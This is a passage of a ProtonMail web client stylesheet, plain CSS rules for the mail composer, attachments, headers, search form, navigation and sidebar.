                -webkit-transition: none !important;
                transition: none !important;
                -webkit-transform: translateX(0) !important;
                transform: translateX(0) !important
            }

            .appConfigBody-activeComposer #pm_composer {
                display: block
            }

            html.protonmail {
                overflow: auto !important;
                height: auto
            }

            html.protonmail .appConfigBody-activeComposer,
            html.protonmail .appConfigBody-modalOpen {
                overflow: auto !important;
                height: auto;
                min-height: 0
            }

            .appConfigBody-maximizedComposer #pm_main,
            .appConfigBody-maximizedComposer #pm_sidebar {
                display: none
            }

            #pm_composer footer .pm_button {
                padding: 0 10px !important
            }

            #pm_composer footer .pm_button span {
                display: none
            }

            #pm_composer footer .pm_button.mobileFull span,
            .appConfigBody-is-mobile #outsideMessageWrap footer .pm_button span {
                display: block
            }

            .appConfigBody-is-mobile#eo-reply #message-body .squire-toolbar {
                padding: 0
            }
        }

        @media screen and (max-width:1030px) {
            #pm_composer .composer.maximized {
                left: 0 !important;
                top: 0;
                width: 100%;
                height: 100% !important;
                -webkit-transform: translateX(0) !important;
                transform: translateX(0) !important;
                border-radius: 0
            }
        }

        @media screen and (max-width:800px) {
            #pm_composer .composer header .pm_button.maximize-button {
                display: none
            }
        }

        @media screen and (max-height:500px) {
            #pm_composer .composer {
                -webkit-transition: none !important;
                transition: none !important;
                -webkit-transform: translateX(0) !important;
                transform: translateX(0) !important
            }

            #pm_composer footer {
                position: relative;
                z-index: 10
            }
        }

        .appConfigBody-is-mobile .composer [data-ng-form^=composeForm],
        .appConfigBody-is-mobile .composer [ng-form^=composeForm] {
            min-height: 250px !important
        }

        .composerOptions-container {
            position: absolute;
            left: 0;
            right: 0;
            top: 32px;
            bottom: 0;
            padding: 2rem 10px;
            margin-bottom: 0 !important;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 99999;
            background: #fafafa;
            display: none
        }

        .composerOptions-container.show {
            display: block
        }

        .composerOptions-container .pm_select {
            display: inline-block !important;
            margin: 0 .5rem 0 2rem
        }

        .composerOptions-container footer {
            position: absolute;
            left: 0;
            right: 0;
            background: #fafafa;
            bottom: 0
        }

        .composerOptions-container .clearfix {
            padding: 5px 0
        }

        .composerOptions-container h3 {
            display: inline-block
        }

        .composerOptions-container h1,
        .composerOptions-container h2,
        .composerOptions-container h3,
        .composerOptions-container h4,
        .composerOptions-container h5 {
            font-weight: 400
        }

        .composerOptions-container input[type=range] {
            width: 100%;
            margin: 2rem 0
        }

        .composerOptions-container .fa {
            color: #9397cd
        }

        .composerOptions-container .pm_button.primary {
            padding: 0 2rem
        }

        .composerOptions-container div.text-center {
            padding: 1rem 0 2rem
        }

        .composerTime-container {
            margin-right: 5px
        }

        .composerExpiration-fields-container {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 100%
        }

        .composerExpiration-fields-container,
        [class*=composerExpiration-field-] {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        [class*=composerExpiration-field-] {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .composerAttachments-container {
            background: #e6eaf0
        }

        .composerAttachments-close .composerAttachments-loaders,
        .composerAttachments-hidden {
            display: none
        }

        .composerAttachments-header {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 32px;
            padding: 0 10px;
            cursor: pointer;
            border-top: 1px solid #acb0bf
        }

        .composerAttachments-header * {
            pointer-events: none
        }

        .composerAttachments-loaders {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            max-height: 85px;
            overflow: auto;
            padding: 10px;
            border-top: 1px solid #acb0bf
        }

        .composerAttachments-loader {
            margin-top: 10px;
            width: 50%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .composerAttachments-loader:first-child,
        .composerAttachments-loader:nth-child(2) {
            margin-top: 0
        }

        .composerAttachments-loader:nth-child(2n) {
            padding-left: 5px
        }

        .composerAttachments-loader:nth-child(odd) {
            padding-right: 5px
        }

        .composerAttachments-size {
            margin-right: 1em
        }

        .composerAttachments-action {
            margin-left: auto
        }

        [class*=composerAttachments-counter-] {
            margin-right: 1em
        }

        .composerAskEmbdded-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            font-size: 1.1rem
        }

        .composerAskEmbdded-details {
            position: relative;
            padding: 40px 0;
            width: 90%;
            margin: 0 auto;
            background: #fff;
            border: 1px solid rgba(0, 0, 0, .2);
            border-radius: 4px;
            z-index: 1
        }

        .composerAskEmbdded-title {
            font-weight: 700;
            margin-bottom: 1.5rem;
            text-align: center
        }

        [class*=composerAskEmbdded-btn-] {
            margin: 0 10px
        }

        .composerAskEmbdded-btn-cancel {
            position: absolute;
            top: 1rem;
            right: 1rem;
            width: 80px;
            display: inline-block;
            background: transparent;
            border: 0;
            font-size: .8rem;
            line-height: 1.1rem;
            cursor: pointer
        }

        .composer-askEmbedding {
            position: absolute;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 15000;
            background: #f5f5f5;
            color: #505061;
            text-align: center
        }

        .composer-askEmbedding:after {
            content: "\F03E";
            font-family: FontAwesome;
            left: -5px;
            position: absolute;
            top: 0;
            z-index: 0;
            font-size: 15rem;
            -webkit-transform: rotate(10deg);
            transform: rotate(10deg);
            opacity: .1
        }

        .composerInputMeta-container {
            position: relative;
            max-height: 32px;
            overflow: hidden;
            padding: 0 0 0 10px !important
        }

        .composerInputMeta-overlay {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: absolute;
            z-index: 2;
            background: #fff;
            color: #333;
            width: 100%;
            height: 100%;
            left: 0;
            padding: 0 10px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .composerInputMeta-overlay-label {
            color: #ccc
        }

        .composerInputMeta-overlay-list {
            padding-right: 20px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .composerInputMeta-container .composerInputMeta-overlay-button {
            z-index: 2
        }

        .composerInputMeta-recipients .composerInputMeta-overlay-label {
            display: none
        }

        .composerInputMeta-overlay-hidden .composerInputMeta-overlay {
            visibility: hidden;
            pointer-events: none
        }

        .composerInputMeta-container.composerInputMeta-overlay-hidden {
            max-height: 100%;
            overflow: inherit
        }

        .progressLoader-container {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .progressLoader-container.pm_button {
            background: #fff;
            padding: 0
        }

        .progressLoader-attachment {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: hidden;
            padding-left: 10px
        }

        .progressLoader-name {
            padding: 0 0 0 10px;
            text-overflow: ellipsis;
            overflow: hidden;
            line-height: 16px;
            text-transform: none;
            white-space: pre
        }

        [class*=progressLoader-btn] {
            background: none;
            border: 0;
            padding: 0 10px
        }

        [class*=progressLoader-btn][disabled] {
            opacity: .6
        }

        .progressLoader-container:not(.progressUpload-uploaded) .progressLoader-btn-remove,
        .progressLoader-container:not(.progressUpload-uploading) .progressLoader-btn-close {
            display: none
        }

        .composerHeader-container {
            background: #505061;
            color: #fff
        }

        .composerHeader-subject {
            width: 22rem;
            max-width: 50%;
            float: left;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            padding: 0 0 0 10px
        }

        .composerHeader-actions {
            float: right
        }

        .composerHeader-btn {
            color: #dadae5 !important;
            float: left;
            height: 32px !important;
            line-height: 32px !important;
            margin: 0 !important;
            padding: 0;
            text-align: center;
            width: 32px
        }

        .composerHeader-btn-icon {
            font-size: 14px
        }

        .headerNoAuth-container {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 0;
            min-height: 61px;
            background: #505061;
            padding: 0 10px;
            border-bottom-color: transparent;
            color: #fff;
            font-family: sans-serif
        }

        .headerNoAuth-container,
        .headerNoAuth-list {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .headerNoAuth-list {
            width: 100%;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            padding: 0;
            margin: 0;
            list-style: none
        }

        .headerNoAuth-list>[class*=headerNoAuth-item] {
            height: 35px;
            max-width: 100%;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis
        }

        .headerNoAuth-list>[class*=headerNoAuth-item] a {
            color: inherit
        }

        .headerNoAuth-list>[class*=headerNoAuth-item] a:not(:hover) {
            text-decoration: none
        }

        .headerNoAuth-item-back {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin-right: auto
        }

        .headerNoAuth-item-back:before {
            content: "\F053";
            font-family: FontAwesome;
            margin-right: 4px
        }

        .headerNoAuth-item-back,
        .headerNoAuth-item-report-button {
            font-size: 12px
        }

        .headerNoAuth-item-report-button {
            height: 35px;
            margin: 0 20px;
            padding: 0 10px;
            border-radius: 2px
        }

        .headerNoAuth-item-report-button:hover {
            background: rgba(0, 0, 0, .2)
        }

        .headerNoAuth-btn-back {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-ordinal-group: 1;
            -webkit-order: 0;
            -ms-flex-order: 0;
            order: 0;
            color: currentColor
        }

        .headerNoAuth-container.isLoggedIn [class*=__noAuth],
        .headerNoAuth-container:not(.isLoggedIn) [class*=__Auth] {
            display: none
        }

        .headerNoAuth-container:not(.isLoggedIn) [class*=__noAuth] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        body#signup .headerNoAuth-item-signup__noAuth,
        body.appConfigBody-is-mobile .headerNoAuth-item-report {
            display: none
        }

        .headerSecured-container {
            display: block;
            background: #6a6f7c;
            color: #fff;
            font-size: 12px;
            position: relative;
            z-index: 3000;
            font-family: sans-serif
        }

        .headerSecuredDesktop-container,
        .headerSecuredMobile-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            width: 100%
        }

        .headerSecuredDesktop-container,
        .headerSecuredDesktop-logo,
        .headerSecuredMobile-container {
            height: 61px;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .headerSecuredDesktop-logo {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 190px;
            background-color: #505061;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-decoration: none;
            padding: 5px 20px 0
        }

        .headerSecuredDesktop-logo:before {
            content: "";
            height: 35px;
            width: 116px;
            background: url(assets/img/logo.svg) no-repeat bottom
        }

        .headerSecuredDesktop-logo:after {
            position: relative;
            width: 116px;
            top: -8px;
            text-align: right;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 1px;
            font-size: .7em;
            content: attr(data-plan-name)
        }

        body.appConfigBody-is-mobile .headerSecuredMobile-container {
            height: 70px
        }

        .headerSecuredMobile-compose,
        .headerSecuredMobile-searchBtn,
        .headerSecuredMobile-toggleSidebar {
            height: 100%;
            font-size: 1.6em;
            width: 2em
        }

        .headerSecuredMobile-toggleSidebar {
            margin-right: auto;
            font-size: 2em
        }

        .headerSecuredMobile-searchBtn {
            width: 3em
        }

        .headerSecuredMobile-compose {
            background: transparent;
            border: 0;
            color: #fff;
            max-width: 4rem;
            min-width: 4rem;
            text-align: center;
            width: auto
        }

        .headerSecuredMobile-compose:hover {
            background: transparent
        }

        .appConfigBody-is-mobile.appConfigBody-activeComposer .headerSecured-container {
            pointer-events: none
        }

        @media screen and (max-width:1030px) {
            .headerSecured-container {
                z-index: 100
            }
        }

        .newBugReport-container {
            border: 0;
            background: transparent;
            cursor: pointer
        }

        .newBugReport-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            height: 100%;
            min-height: 100%;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .newBugReport-icon {
            margin-right: 5px
        }

        .searchForm-container {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            position: relative;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 35px;
            width: calc(100% - 700px);
            max-width: 25%;
            margin-left: 10px;
            color: inherit
        }

        .searchForm-container.searchForm-container-adv .searchForm-action-button,
        .searchForm-container.searchForm-container-adv .searchForm-action-button-default,
        .searchForm-container:not(.searchForm-container-adv) .searchForm-action-button-advanced {
            display: none
        }

        .search-form-fieldset {
            max-width: 100%;
            height: 35px;
            border-radius: 35px;
            background: hsla(0, 0%, 90%, .2)
        }

        .search-form-fieldset,
        .search-form-fieldset-input {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .search-form-fieldset-input {
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            padding: 0 0 0 2px;
            color: inherit;
            font-size: 14px;
            border-radius: 35px;
            background: transparent;
            border: 0;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            min-width: 50px
        }

        .search-form-fieldset-input:-moz-placeholder,
        .search-form-fieldset-input:-ms-input-placeholder,
        .search-form-fieldset-input::-moz-placeholder,
        .search-form-fieldset-input::-webkit-input-placeholder {
            color: hsla(0, 0%, 100%, .75)
        }

        .search-form-fieldset-input::-ms-clear {
            display: none;
            width: 0;
            height: 0
        }

        [class*=searchForm-action-button-] {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            position: relative;
            z-index: 5;
            width: 35px;
            padding: 0;
            margin: 0;
            color: inherit;
            border: 0;
            cursor: pointer;
            background: transparent;
            -webkit-transition: background-color .25s ease;
            transition: background-color .25s ease;
            outline: none
        }

        [class*=searchForm-action-button-]>i {
            margin: 0 auto
        }

        .searchForm-icon {
            pointer-events: none
        }

        .searchForm-action-button-advanced,
        .searchForm-action-button-clear,
        .searchForm-action-button-toggle {
            border-radius: 0 35px 35px 0
        }

        .searchForm-action-button-advanced:hover,
        .searchForm-action-button-clear:hover,
        .searchForm-action-button-toggle:hover {
            background: rgba(52, 52, 52, .2)
        }

        .searchForm-action-button-advanced {
            display: none
        }

        .searchForm-container-adv .search-form-fieldset {
            border-radius: 1rem 1rem 0 0
        }

        .searchForm-container-adv .search-form-fieldset .search-form-fieldset-input {
            visibility: hidden
        }

        .searchForm-container-adv .search-form-fieldset .searchForm-action-button-toggle {
            display: none
        }

        .searchForm-container-adv .search-form-fieldset .searchForm-action-button-advanced {
            border-radius: 0 1rem 0 0;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .searchForm-advanced-container {
            position: absolute;
            left: 0;
            top: 0;
            -webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
            box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
            z-index: 2;
            border-radius: 1rem;
            padding: 35px 0 0;
            right: 0
        }

        .searchForm-advanced-container label {
            color: #555
        }

        .searchForm-advanced-container .input-icon {
            display: block
        }

        .searchForm-advanced-container .autocompleteEmail-container .awesomplete {
            position: relative !important;
            margin: 0
        }

        .searchForm-advanced-container .autocompleteEmail-container [aria-selected] {
            line-height: 1.3
        }

        .searchForm-advanced-wrapper {
            background: #f2f2f2;
            float: left;
            padding: .5rem 1rem 1rem;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-radius: 0 0 1rem 1rem
        }

        .searchForm-advanced-wrapper>.row {
            line-height: 36px
        }

        .searchForm-advanced-wrapper .pm_select,
        .searchForm-advanced-wrapper input[type] {
            background: #fff
        }

        .searchForm-advanced-main {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: 1rem 1rem 0;
            background: #fff;
            position: relative;
            -webkit-box-shadow: 0 4px 4px -4px rgba(0, 0, 0, .1);
            box-shadow: 0 4px 4px -4px rgba(0, 0, 0, .1)
        }

        .searchForm-advanced-wildcard-container {
            cursor: pointer
        }

        .searchFrom-advanced-radio {
            line-height: 33px
        }

        .searchForm-advanced-submit {
            margin-top: .5em;
            width: 100%
        }

        .searchForm-action-button-clear:not(.ng-not-empty)~.searchForm-clear-button {
            display: none
        }

        body:not(.appConfigBody-is-mobile) .searchFrom-advanced-radio label {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        body.appConfigBody-is-mobile .searchForm-container {
            position: static
        }

        body.appConfigBody-is-mobile .search-form-fieldset {
            display: none
        }

        body.appConfigBody-is-mobile .searchForm-advanced-container {
            top: 70px;
            max-height: calc(100vh - 70px);
            overflow: auto;
            -webkit-box-shadow: none;
            box-shadow: none;
            border-radius: none;
            padding-top: 0
        }

        body.appConfigBody-is-mobile .searchForm-advanced-wrapper {
            border-radius: 0;
            border-bottom: 1px solid #acb0bf
        }

        body.appConfigBody-is-mobile .searchForm-advanced-wrapper>.row>[class*=col-] {
            float: left;
            width: 100% !important;
            clear: both;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0
        }

        .btnAdvancedSearch-container {
            background: transparent;
            border: 0
        }

        .appConfigBody-is-mobile .btnAdvancedSearch-icon-desktop,
        body:not(.appConfigBody-is-mobile) .btnAdvancedSearch-icon-mobile {
            display: none
        }

        #advancedSearchModal {
            display: block
        }

        #advancedSearchModal .row {
            margin-bottom: 1rem
        }

        #advancedSearchModal .date {
            position: relative
        }

        #advancedSearchModal .date em {
            position: absolute;
            right: 2rem;
            top: 1px;
            bottom: 1px;
            text-align: right;
            display: block;
            line-height: 32px;
            height: 32px;
            color: #e1e1e1
        }

        #advancedSearchModal .last.date em {
            right: 1rem
        }

        #advancedSearchModal .pm_select {
            margin-bottom: 0
        }

        body .is-selected .pika-button {
            background: #9397cd;
            -webkit-box-shadow: inset 1px 1px 1px rgba(0, 0, 0, .25);
            box-shadow: inset 1px 1px 1px rgba(0, 0, 0, .25);
            color: #fff !important
        }

        body .is-today .pika-button {
            color: #9397cd
        }

        body .pika-button:hover {
            background: rgba(0, 0, 0, .25)
        }

        body.appConfigBody-is-mobile #advancedSearchModal .pm_form .radio label {
            display: block
        }

        .searchLimit-container {
            padding: 20px 30px;
            font-size: 1.1em;
            font-weight: 700;
            text-align: center;
            background: -webkit-gradient(linear, left top, left bottom, from(rgba(147, 151, 205, .25)), to(rgba(147, 151, 205, 0)));
            background: linear-gradient(180deg, rgba(147, 151, 205, .25) 0, rgba(147, 151, 205, 0));
            -webkit-box-shadow: inset 0 2px 2px rgba(0, 0, 0, .05);
            box-shadow: inset 0 2px 2px rgba(0, 0, 0, .05)
        }

        .navigation {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            margin: 0 10px 0 0;
            padding: 0;
            height: 100%
        }

        .navigation,
        .navigation>li {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .navigation>li {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            position: relative;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 115px;
            -ms-flex: 0 0 115px;
            flex: 0 0 115px;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            list-style: none;
            border-top: 5px solid transparent;
            -webkit-transition: border .15s ease-in-out;
            transition: border .15s ease-in-out
        }

        .navigation>li.active,
        .navigation>li:hover {
            border-color: #9397cd
        }

        .navigation-link {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            text-decoration: none;
            height: 100%;
            color: inherit;
            opacity: .9
        }

        .navigation-icon,
        .navigation-icons,
        .navigation-link {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .navigation-icon,
        .navigation-icons {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            width: 20px;
            height: 20px;
            font-size: 15px
        }

        .navigation-icon .fa-angle-down,
        .navigation-icons .fa-angle-down {
            font-size: 13px;
            margin-left: 2px
        }

        .navigation-title {
            line-height: 20px;
            font-weight: 400;
            text-transform: uppercase;
            text-align: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .navigation.navigation-is-black-friday .navigation-upgrade-item,
        .navigation:not(.navigation-is-black-friday) .navigationBlackFriday {
            display: none
        }

        .navigationUser-dropdown {
            color: #555
        }

        .navigationUser-head {
            text-align: left;
            line-height: 1rem;
            margin-bottom: 1rem;
            float: left;
            display: block;
            width: 100%
        }

        .navigationUser-head-display-name,
        .navigationUser-head-email,
        .navigationUser-head-organization {
            display: block;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .navigationUser-head-display-name {
            text-transform: uppercase
        }

        .navigationUser-help {
            text-decoration: none;
            color: inherit
        }

        .navigationUser-help>i {
            font-size: 16px
        }

        .pm_dropdown .navigationUser-logout {
            margin-top: 1rem
        }

        .pm_dropdown .navigationUser-logout:hover {
            background: #8286c5 !important;
            color: #fff !important
        }

        .navigationUser-version {
            margin-bottom: -15px;
            font-size: .8em;
            color: currentColor;
            text-decoration: none
        }

        .navigationReport-dropdown {
            color: #555
        }

        .navigationReport-help {
            text-decoration: none;
            color: currentColor
        }

        .navigationReport-help>i {
            font-size: 16px
        }

        #pm_sidebar {
            float: left;
            height: 100%
        }

        #ptSidebar {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: stretch;
            -webkit-align-items: stretch;
            -ms-flex-align: stretch;
            align-items: stretch;
            -webkit-align-content: space-between;
            -ms-flex-line-pack: justify;
            align-content: space-between;
            width: 190px;
            min-width: 190px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: auto;
            float: left;
            background: #505061;
            height: calc(100% - 61px);
            will-change: transform
        }

        #ptSidebar>* {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .sidebarApp-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: stretch;
            -webkit-align-items: stretch;
            -ms-flex-align: stretch;
            align-items: stretch;
            -webkit-align-content: space-between;
            -ms-flex-line-pack: justify;
            align-content: space-between;
            position: relative;
            padding: 0 20px
        }

        .sidebarApp-container .sidebar-btn-back,
        .sidebarApp-container .sidebar-btn-compose {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            min-height: 40px;
            margin-bottom: 10px;
            font-size: 12px;
            padding: 0;
            text-align: center;
            width: 100%;
            text-transform: uppercase;
            border-color: transparent;
            letter-spacing: 1px;
            border-radius: 2px;
            line-height: 16px;
            padding: 12px 0 10px;
            text-decoration: none;
            margin-bottom: 15px
        }

        .sidebarApp-container .sidebar-btn-back {
            border: 1px solid hsla(0, 0%, 100%, .6);
            color: #fff;
            text-align: center
        }

        .sidebarApp-container .sidebar-btn-compose {
            background: #9397cd;
            border-color: #9397cd;
            color: #fff
        }

        .sidebarApp-container .sidebar-btn-compose:hover {
            background-color: #8286c5;
            border-color: transparent;
            color: #fff
        }

        .sidebarApp-container .footer,
        .sidebarApp-container .sidebarApp-wrapper {
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0
        }

        .sidebarApp-container .footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            text-align: center;
            font-size: 10px;
            padding: 10px 0 5px;
            margin-top: auto
        }

        .sidebarApp-container .footer .wrap {
            padding: 0;
            margin: 0 -10px
        }

        .sidebarApp-container .footer div.link a {
            display: inline-block;
            padding: 3px 0;
            text-transform: uppercase;
            font-weight: 700;
            color: #9397cd;
            text-decoration: none
        }

        .sidebarApp-container .footer div.link a:hover {
            color: #fff
        }

        .sidebarApp-container .footer div.storage {
            padding: 0
        }

        .sidebarApp-container .footer div.storage strong {
            color: #9397cd
        }

        .sidebarApp-container .footer div.storage .fa {
            margin-right: .5rem;
            opacity: .5
        }

        .sidebarApp-container .footer a.upgrade {
            display: block;
            text-align: center;
            color: #9397cd;
            text-decoration: none;
            font-weight: 700
        }

        .sidebarApp-container .footer .storageBar {
            width: 90%;
            background-color: hsla(0, 0%, 100%, .1)
        }

        .sidebarApp-container .version {
            letter-spacing: 0;
            text-decoration: none;
            font-weight: 700;
            color: hsla(0, 0%, 100%, .8)
        }

        .sidebarApp-container .version:hover {
            color: #fff
        }

        .sidebarApp-link {
            background: transparent;
            border: 0;
            text-align: left
        }

        .sidebarApp-container a {
            cursor: pointer
        }

        .sidebarApp-menu {
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            padding: 0;
            display: block;
            list-style-type: none;
            font-size: 14px;
            margin: 0 -20px 10px -25px
        }

        .sidebarApp-menu .ico-protonvpn {
            height: 16px;
            opacity: .5
        }

        .sidebarApp-menu a {
            cursor: pointer
        }

        .sidebarApp-item,
        .sidebarApp-menu li {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-content: center;
            -ms-flex-line-pack: center;
            align-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .sidebarApp-item .navigationItem-btn-refresh {
            padding: 0;
            cursor: pointer;
            margin: 0 0 0 auto;
            background: transparent;
            color: hsla(0, 0%, 100%, .35);
            border: 0
        }

        .sidebarApp-item .navigationItem-btn-refresh:hover {
            color: #fff
        }

        .sidebarApp-item .navigationItem-item,
        .sidebarApp-item .sidebarApp-link,
        .sidebarApp-menu .menuLabel-link {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%;
            height: 31px;
            text-decoration: none;
            padding: 0 10px 0 20px;
            position: relative;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            color: hsla(0, 0%, 100%, .8)
        }

        .sidebarApp-item .navigationItem-item:hover,
        .sidebarApp-item .sidebarApp-link:hover,
        .sidebarApp-menu .menuLabel-link:hover {
            color: #fff
        }

        .sidebarApp-item .navigationItem-item {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-content: center;
            -ms-flex-line-pack: center;
            align-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            line-height: normal
        }

        .sidebarApp-item .sidebarApp-label {
            text-overflow: ellipsis;
            overflow: hidden
        }

